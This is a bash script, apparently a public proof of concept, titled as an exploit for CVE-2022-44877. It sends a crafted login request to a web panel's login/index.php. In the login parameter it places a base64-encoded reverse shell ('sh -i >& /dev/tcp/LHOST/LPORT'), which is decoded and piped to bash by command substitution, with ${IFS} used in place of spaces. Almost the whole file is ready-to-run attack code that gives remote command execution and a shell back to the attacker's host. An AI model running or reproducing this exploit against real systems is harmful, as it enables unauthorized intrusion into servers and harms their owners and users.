#!/bin/bash

function help {

echo -e "\e[32m

                                        
                                        
                .;;;;;,.                
             ...cdddddo;...             
            ,loodddddddoooc'            
         .,;cdddddddddddddoc;'.         
         ,odlccloddddddlcccodc.         
      .;:cdo,. .:dddddo,. .cdoc:,.      
      ;ddddo;...:dddddo;...cddddl.      
      ;dddddollodddddddoooooddddl.      
      .',,,;lddoc,,,,,;lddoc,'''.       
           .;ddo,     .:ddl'            
         .;;;,,,;:;;;;:;,,,;;,.         
     ....;cc,...;cccccc,..';c:'...      
     ;ooo;..;ool,.    .:ool,..:ooc.     
     ,ccc'  'cc:.      ,lc:. .,cc;.     
                                        
                                        
                                        

 #     # #     # #######  #####  #     # ######  ####### ######  
 ##   ## #     #      #  #     #  #   #  #     # #       #     # 
 # # # # #     #     #   #         # #   #     # #       #     # 
 #  #  # #######    #    #          #    ######  #####   ######  
 #     # #     #   #     #          #    #     # #       #   #   
 #     # #     #  #      #     #    #    #     # #       #    #  
 #     # #     # #######  #####     #    ######  ####### #     # 

               [!] CVE-2022-44877 Exploit
\e[0m"
    
echo "[-] USAGE: $0 Target_URL Target_username LHOST LPORT"
echo "[-] Example: $0 https://192.168.1.108:2031/ root 192.168.1.100 9001"
exit 1
}

function exploit {
target_url=$1
target_un=$2
lhost=$3
lport=$4

payload="sh -i >& /dev/tcp/${lhost}/${lport} 0>&1"
payload_base64=$(echo -n ${payload} | base64)

target_ip=$(egrep -o '([0-9]{1,3}[.]){3}[0-9]{1,3}' <<< ${target_url})

echo $target_ip

port=$(echo ${target_url} |  grep -oP ':\K\d+')

echo $port

curl -i -s -k -X $'POST' \
-H $'Host: '${target_ip}':'${port} \
-H $'Content-Type: application/x-www-form-urlencoded' \
--data-binary $'username='${target_un}'&password=test&commit=Login' \
-g ${target_url}'login/index.php?login=$(echo${IFS}'${payload_base64}'${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)'

}

if [[ $# -eq 4 ]]; then
exploit "$1" "$2" "$3" "$4"
else
help
fi